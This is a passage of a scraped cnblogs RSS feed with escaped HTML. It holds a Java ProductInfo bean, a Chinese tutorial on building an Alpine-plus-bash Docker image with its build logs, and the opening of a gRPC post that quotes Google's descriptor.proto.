&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('2f55cd52-ffd8-423d-873a-0e1db65083da')&quot; readability=&quot;34.5&quot;&gt;&lt;img id=&quot;code_img_closed_2f55cd52-ffd8-423d-873a-0e1db65083da&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_2f55cd52-ffd8-423d-873a-0e1db65083da&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('2f55cd52-ffd8-423d-873a-0e1db65083da',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_2f55cd52-ffd8-423d-873a-0e1db65083da&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;64&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ProductInfo {

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; Id;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String ProductName;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String Description;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String CityCode;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String CityName;
    
    
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; getId() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Id;
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; setId(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; id) {
        Id &lt;/span&gt;=&lt;span&gt; id;
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getProductName() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ProductName;
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setProductName(String productName) {
        ProductName &lt;/span&gt;=&lt;span&gt; productName;
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getDescription() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Description;
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setDescription(String description) {
        Description &lt;/span&gt;=&lt;span&gt; description;
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getCityCode() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; CityCode;
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setCityCode(String cityCode) {
        CityCode &lt;/span&gt;=&lt;span&gt; cityCode;
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getCityName() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; CityName;
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setCityName(String cityName) {
        CityName &lt;/span&gt;=&lt;span&gt; cityName;
    }
    
    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String toString() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;Product [id=&quot; + Id + &quot;, ProductName=&quot; + ProductName + &quot;, Description=&quot; +&lt;span&gt; Description
                &lt;/span&gt;+ &quot;, CityCode=&quot; + CityCode + &quot;, CityName=&quot; + CityName + &quot;]&quot;&lt;span&gt;;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;

</description>
<pubDate>Wed, 04 Jul 2018 16:16:00 +0000</pubDate>
<dc:creator>仍是少年</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/ashleyboy/p/9266134.html</dc:identifier>
</item>
<item>
<title>docker镜像创建 - lobin.tong</title>
<link>http://www.cnblogs.com/lobin/p/9266090.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lobin/p/9266090.html</guid>
<description>&lt;p&gt;1. 首选要创建一个Dockerfile文件，内容如下：&lt;/p&gt;
&lt;p&gt;FROM alpine:latest&lt;/p&gt;
&lt;p&gt;MAINTAINER  lobin &amp;lt;lobin.hotmail.com&amp;gt;&lt;/p&gt;
&lt;p&gt;RUN apk add --no-cache --update-cache bash&lt;/p&gt;
&lt;p&gt;CMD [&quot;/bin/bash&quot;]&lt;/p&gt;

&lt;p&gt;2. 生成镜像,取名apline-bash&lt;/p&gt;

&lt;p&gt;[root@VM_0_13_centos demo]# docker build -t apline-bash .&lt;/p&gt;
&lt;p&gt;Sending build context to Docker daemon 2.048 kB&lt;/p&gt;
&lt;p&gt;Step 1/4 : FROM alpine:latest&lt;/p&gt;
&lt;p&gt; ---&amp;gt; 3fd9065eaf02&lt;/p&gt;
&lt;p&gt;Step 2/4 : MAINTAINER lobin &amp;lt;lobin.hotmail.com&amp;gt;&lt;/p&gt;
&lt;p&gt; ---&amp;gt; [Warning] IPv4 forwarding is disabled. Networking will not work.&lt;/p&gt;
&lt;p&gt; ---&amp;gt; Running in a73f8500b494&lt;/p&gt;
&lt;p&gt; ---&amp;gt; 398e9ed5537e&lt;/p&gt;
&lt;p&gt;Removing intermediate container a73f8500b494&lt;/p&gt;
&lt;p&gt;Step 3/4 : RUN apk add --no-cache --update-cache bash&lt;/p&gt;
&lt;p&gt; ---&amp;gt; [Warning] IPv4 forwarding is disabled. Networking will not work.&lt;/p&gt;
&lt;p&gt; ---&amp;gt; Running in dd629be23601&lt;/p&gt;

&lt;p&gt;fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/main/x86_64/APKINDEX.tar.gz&lt;/p&gt;
&lt;p&gt;fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/main/x86_64/APKINDEX.tar.gz&lt;/p&gt;
&lt;p&gt;ERROR: http://dl-cdn.alpinelinux.org/alpine/v3.7/main: temporary error (try again later)&lt;/p&gt;
&lt;p&gt;WARNING: Ignoring http://dl-cdn.alpinelinux.org/alpine/v3.7/main/x86_64/APKINDEX.tar.gz: temporary error (try again later)&lt;/p&gt;
&lt;p&gt;fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/community/x86_64/APKINDEX.tar.gz&lt;/p&gt;
&lt;p&gt;ERROR: http://dl-cdn.alpinelinux.org/alpine/v3.7/community: temporary error (try again later)&lt;/p&gt;
&lt;p&gt;fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/community/x86_64/APKINDEX.tar.gz&lt;/p&gt;
&lt;p&gt;  bash (missing):&lt;/p&gt;
&lt;p&gt;    required by: world[bash]&lt;/p&gt;
&lt;p&gt;WARNING: Ignoring http://dl-cdn.alpinelinux.org/alpine/v3.7/community/x86_64/APKINDEX.tar.gz: temporary error (try again later)&lt;/p&gt;
&lt;p&gt;ERROR: unsatisfiable constraints:&lt;/p&gt;
&lt;p&gt;The command '/bin/sh -c apk add --no-cache --update-cache bash' returned a non-zero code: 1&lt;/p&gt;

&lt;p&gt;3. 出现以上错误，没辙，重启docker能解决，但问题不知道&lt;/p&gt;


&lt;p&gt;[root@VM_0_13_centos demo]# systemctl restart docker&lt;/p&gt;

&lt;p&gt;4. 重新构建镜像&lt;/p&gt;


&lt;p&gt;[root@VM_0_13_centos demo]# docker build -t apline-bash .&lt;/p&gt;
&lt;p&gt;Sending build context to Docker daemon 2.048 kB&lt;/p&gt;
&lt;p&gt;Step 1/4 : FROM alpine:latest&lt;/p&gt;
&lt;p&gt; ---&amp;gt; 3fd9065eaf02&lt;/p&gt;
&lt;p&gt;Step 2/4 : MAINTAINER lobin &amp;lt;lobin.hotmail.com&amp;gt;&lt;/p&gt;
&lt;p&gt; ---&amp;gt; Using cache&lt;/p&gt;
&lt;p&gt; ---&amp;gt; 398e9ed5537e&lt;/p&gt;
&lt;p&gt;Step 3/4 : RUN apk add --no-cache --update-cache bash&lt;/p&gt;
&lt;p&gt; ---&amp;gt; Running in 4ce990201bfd&lt;/p&gt;

&lt;p&gt;fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/main/x86_64/APKINDEX.tar.gz&lt;/p&gt;
&lt;p&gt;fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/main/x86_64/APKINDEX.tar.gz&lt;/p&gt;
&lt;p&gt;fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/community/x86_64/APKINDEX.tar.gz&lt;/p&gt;
&lt;p&gt;fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/community/x86_64/APKINDEX.tar.gz&lt;/p&gt;
&lt;p&gt;(1/6) Installing pkgconf (1.3.10-r0)&lt;/p&gt;
&lt;p&gt;(2/6) Installing ncurses-terminfo-base (6.0_p20171125-r0)&lt;/p&gt;
&lt;p&gt;(3/6) Installing ncurses-terminfo (6.0_p20171125-r0)&lt;/p&gt;
&lt;p&gt;(4/6) Installing ncurses-libs (6.0_p20171125-r0)&lt;/p&gt;
&lt;p&gt;(5/6) Installing readline (7.0.003-r0)&lt;/p&gt;
&lt;p&gt;(6/6) Installing bash (4.4.19-r1)&lt;/p&gt;
&lt;p&gt;Executing bash-4.4.19-r1.post-install&lt;/p&gt;
&lt;p&gt;Executing busybox-1.27.2-r7.trigger&lt;/p&gt;
&lt;p&gt;OK: 13 MiB in 17 packages&lt;/p&gt;
&lt;p&gt; ---&amp;gt; b6ed2497fc7e&lt;/p&gt;
&lt;p&gt;Removing intermediate container 4ce990201bfd&lt;/p&gt;
&lt;p&gt;Step 4/4 : CMD /bin/bash&lt;/p&gt;
&lt;p&gt; ---&amp;gt; Running in 61323661705d&lt;/p&gt;
&lt;p&gt; ---&amp;gt; a7414979d240&lt;/p&gt;
&lt;p&gt;Removing intermediate container 61323661705d&lt;/p&gt;
&lt;p&gt;Successfully built a7414979d240&lt;/p&gt;
&lt;p&gt;[root@VM_0_13_centos demo]# &lt;/p&gt;
&lt;p&gt;Message from syslogd@localhost at Jul  4 23:49:17 ...&lt;/p&gt;
&lt;p&gt; kernel:unregister_netdevice: waiting for lo to become free. Usage count = 1&lt;/p&gt;

&lt;p&gt;Message from syslogd@localhost at Jul  4 23:49:27 ...&lt;/p&gt;
&lt;p&gt; kernel:unregister_netdevice: waiting for lo to become free. Usage count = 1&lt;/p&gt;

&lt;p&gt;5. 查看镜像，好小呀&lt;/p&gt;
&lt;p&gt;[root@VM_0_13_centos demo]# docker images&lt;/p&gt;
&lt;p&gt;REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE&lt;/p&gt;
&lt;p&gt;apline-bash         latest              a7414979d240        8 minutes ago       9.5 MB&lt;/p&gt;
&lt;p&gt;docker.io/redis     latest              71a81cb279e3        7 days ago          83.4 MB&lt;/p&gt;
&lt;p&gt;docker.io/mysql     latest              8d99edb9fd40        7 days ago          445 MB&lt;/p&gt;
&lt;p&gt;docker.io/alpine    latest              3fd9065eaf02        5 months ago        4.15 MB&lt;/p&gt;

</description>
<pubDate>Wed, 04 Jul 2018 15:57:00 +0000</pubDate>
<dc:creator>lobin.tong</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lobin/p/9266090.html</dc:identifier>
</item>
<item>
<title>【gRPC使用问题1】gRPC的proto内import其他proto导致的一次小坑 - 王庆东mas</title>
<link>http://www.cnblogs.com/x-poior/p/9266087.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/x-poior/p/9266087.html</guid>
<description>&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Protocol Buffers - Google's data interchange format
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Copyright 2008 Google Inc.  All rights reserved.
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt; &lt;span&gt;https://developers.google.com/protocol-buffers/&lt;/span&gt;
&lt;span&gt;//&lt;/span&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Redistribution and use in source and binary forms, with or without
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; modification, are permitted provided that the following conditions are
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; met:
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;     * Redistributions of source code must retain the above copyright
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; notice, this list of conditions and the following disclaimer.
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;     * Redistributions in binary form must reproduce the above
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; copyright notice, this list of conditions and the following disclaimer
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; in the documentation and/or other materials provided with the
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; distribution.
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;     * Neither the name of Google Inc. nor the names of its
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; contributors may be used to endorse or promote products derived from
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; this software without specific prior written permission.
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; &quot;AS IS&quot; AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Author: kenton@google.com (Kenton Varda)
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;  Based on original Protocol Buffers design by
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;  Sanjay Ghemawat, Jeff Dean, and others.
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The messages in this file describe the definitions found in .proto files.
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; A valid .proto file can be translated directly to a FileDescriptorProto
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; without any other information (e.g. without reading its imports).&lt;/span&gt;
&lt;span&gt;

syntax &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;proto2&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

package google.protobuf;
option go_package &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;github.com/golang/protobuf/protoc-gen-go/descriptor;descriptor&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
option java_package &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;com.google.protobuf&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
option java_outer_classname &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;DescriptorProtos&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
option csharp_namespace &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Google.Protobuf.Reflection&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
option objc_class_prefix &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;GPB&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
option cc_enable_arenas &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; descriptor.proto must be optimized for speed because reflection-based
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; algorithms don't work during bootstrapping.&lt;/span&gt;
option optimize_for =&lt;span&gt; SPEED;

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The protocol compiler can output a FileDescriptorSet containing the .proto
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; files it parses.&lt;/span&gt;
&lt;span&gt;message FileDescriptorSet {
  repeated FileDescriptorProto file &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Describes a complete .proto file.&lt;/span&gt;
&lt;span&gt;message FileDescriptorProto {
  optional &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; name = &lt;span&gt;1&lt;/span&gt;;       &lt;span&gt;//&lt;/span&gt;&lt;span&gt; file name, relative to root of source tree&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; package = &lt;span&gt;2&lt;/span&gt;;    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; e.g. &quot;foo&quot;, &quot;foo.bar&quot;, etc.

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Names of files imported by this file.&lt;/span&gt;
  repeated &lt;span&gt;string&lt;/span&gt; dependency = &lt;span&gt;3&lt;/span&gt;&lt;span&gt;;
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Indexes of the public imported files in the dependency list above.&lt;/span&gt;
  repeated int32 public_dependency = &lt;span&gt;10&lt;/span&gt;&lt;span&gt;;
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Indexes of the weak imported files in the dependency list.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; For Google-internal migration only. Do not use.&lt;/span&gt;
  repeated int32 weak_dependency = &lt;span&gt;11&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; All top-level definitions in this file.&lt;/span&gt;
  repeated DescriptorProto message_type = &lt;span&gt;4&lt;/span&gt;&lt;span&gt;;
  repeated EnumDescriptorProto enum_type &lt;/span&gt;= &lt;span&gt;5&lt;/span&gt;&lt;span&gt;;
  repeated ServiceDescriptorProto service &lt;/span&gt;= &lt;span&gt;6&lt;/span&gt;&lt;span&gt;;
  repeated FieldDescriptorProto extension &lt;/span&gt;= &lt;span&gt;7&lt;/span&gt;&lt;span&gt;;

  optional FileOptions options &lt;/span&gt;= &lt;span&gt;8&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This field contains optional information about the original source code.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; You may safely remove this entire field without harming runtime
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; functionality of the descriptors -- the information is needed only by
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; development tools.&lt;/span&gt;
  optional SourceCodeInfo source_code_info = &lt;span&gt;9&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The syntax of the proto file.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The supported values are &quot;proto2&quot; and &quot;proto3&quot;.&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; syntax = &lt;span&gt;12&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Describes a message type.&lt;/span&gt;
&lt;span&gt;message DescriptorProto {
  optional &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; name = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

  repeated FieldDescriptorProto field &lt;/span&gt;= &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;
  repeated FieldDescriptorProto extension &lt;/span&gt;= &lt;span&gt;6&lt;/span&gt;&lt;span&gt;;

  repeated DescriptorProto nested_type &lt;/span&gt;= &lt;span&gt;3&lt;/span&gt;&lt;span&gt;;
  repeated EnumDescriptorProto enum_type &lt;/span&gt;= &lt;span&gt;4&lt;/span&gt;&lt;span&gt;;

  message ExtensionRange {
    optional int32 start &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    optional int32 end &lt;/span&gt;= &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;

    optional ExtensionRangeOptions options &lt;/span&gt;= &lt;span&gt;3&lt;/span&gt;&lt;span&gt;;
  }
  repeated ExtensionRange extension_range &lt;/span&gt;= &lt;span&gt;5&lt;/span&gt;&lt;span&gt;;

  repeated OneofDescriptorProto oneof_decl &lt;/span&gt;= &lt;span&gt;8&lt;/span&gt;&lt;span&gt;;

  optional MessageOptions options &lt;/span&gt;= &lt;span&gt;7&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Range of reserved tag numbers. Reserved tag numbers may not be used by
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; fields or extension ranges in the same message. Reserved ranges may
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; not overlap.&lt;/span&gt;
&lt;span&gt;  message ReservedRange {
    optional int32 start &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Inclusive.&lt;/span&gt;
    optional int32 end = &lt;span&gt;2&lt;/span&gt;;   &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Exclusive.&lt;/span&gt;
&lt;span&gt;  }
  repeated ReservedRange reserved_range &lt;/span&gt;= &lt;span&gt;9&lt;/span&gt;&lt;span&gt;;
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Reserved field names, which may not be used by fields in the same message.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; A given name may only be reserved once.&lt;/span&gt;
  repeated &lt;span&gt;string&lt;/span&gt; reserved_name = &lt;span&gt;10&lt;/span&gt;&lt;span&gt;;
}

message ExtensionRangeOptions {
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The parser stores options it doesn't recognize here. See above.&lt;/span&gt;
  repeated UninterpretedOption uninterpreted_option = &lt;span&gt;999&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Clients can define custom options in extensions of this message. See above.&lt;/span&gt;
  extensions &lt;span&gt;1000&lt;/span&gt;&lt;span&gt; to max;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Describes a field within a message.&lt;/span&gt;
&lt;span&gt;message FieldDescriptorProto {
  &lt;/span&gt;&lt;span&gt;enum&lt;/span&gt;&lt;span&gt; Type {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 0 is reserved for errors.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Order is weird for historical reasons.&lt;/span&gt;
    TYPE_DOUBLE         = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    TYPE_FLOAT          &lt;/span&gt;= &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Not ZigZag encoded.  Negative numbers take 10 bytes.  Use TYPE_SINT64 if
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; negative values are likely.&lt;/span&gt;
    TYPE_INT64          = &lt;span&gt;3&lt;/span&gt;&lt;span&gt;;
    TYPE_UINT64         &lt;/span&gt;= &lt;span&gt;4&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Not ZigZag encoded.  Negative numbers take 10 bytes.  Use TYPE_SINT32 if
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; negative values are likely.&lt;/span&gt;
    TYPE_INT32          = &lt;span&gt;5&lt;/span&gt;&lt;span&gt;;
    TYPE_FIXED64        &lt;/span&gt;= &lt;span&gt;6&lt;/span&gt;&lt;span&gt;;
    TYPE_FIXED32        &lt;/span&gt;= &lt;span&gt;7&lt;/span&gt;&lt;span&gt;;
    TYPE_BOOL           &lt;/span&gt;= &lt;span&gt;8&lt;/span&gt;&lt;span&gt;;
    TYPE_STRING         &lt;/span&gt;= &lt;span&gt;9&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Tag-delimited aggregate.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Group type is deprecated and not supported in proto3. However, Proto3
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; implementations should still be able to parse the group wire format and
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; treat group fields as unknown fields.&lt;/span&gt;
    TYPE_GROUP          = &lt;span&gt;10&lt;/span&gt;&lt;span&gt;;
    TYPE_MESSAGE        &lt;/span&gt;= &lt;span&gt;11&lt;/span&gt;;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Length-delimited aggregate.

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; New in version 2.&lt;/span&gt;
    TYPE_BYTES          = &lt;span&gt;12&lt;/span&gt;&lt;span&gt;;
    TYPE_UINT32         &lt;/span&gt;= &lt;span&gt;13&lt;/span&gt;&lt;span&gt;;
    TYPE_ENUM           &lt;/span&gt;= &lt;span&gt;14&lt;/span&gt;&lt;span&gt;;
    TYPE_SFIXED32       &lt;/span&gt;= &lt;span&gt;15&lt;/span&gt;&lt;span&gt;;
    TYPE_SFIXED64       &lt;/span&gt;= &lt;span&gt;16&lt;/span&gt;&lt;span&gt;;
    TYPE_SINT32         &lt;/span&gt;= &lt;span&gt;17&lt;/span&gt;;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Uses ZigZag encoding.&lt;/span&gt;
    TYPE_SINT64         = &lt;span&gt;18&lt;/span&gt;;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Uses ZigZag encoding.&lt;/span&gt;
&lt;span&gt;  };

  &lt;/span&gt;&lt;span&gt;enum&lt;/span&gt;&lt;span&gt; Label {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 0 is reserved for errors&lt;/span&gt;
    LABEL_OPTIONAL      = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    LABEL_REQUIRED      &lt;/span&gt;= &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;
    LABEL_REPEATED      &lt;/span&gt;= &lt;span&gt;3&lt;/span&gt;&lt;span&gt;;
  };

  optional &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; name = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
  optional int32 number &lt;/span&gt;= &lt;span&gt;3&lt;/span&gt;&lt;span&gt;;
  optional Label label &lt;/span&gt;= &lt;span&gt;4&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; If type_name is set, this need not be set.  If both this and type_name
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; are set, this must be one of TYPE_ENUM, TYPE_MESSAGE or TYPE_GROUP.&lt;/span&gt;
  optional Type type = &lt;span&gt;5&lt;/span&gt;&lt;span&gt;;

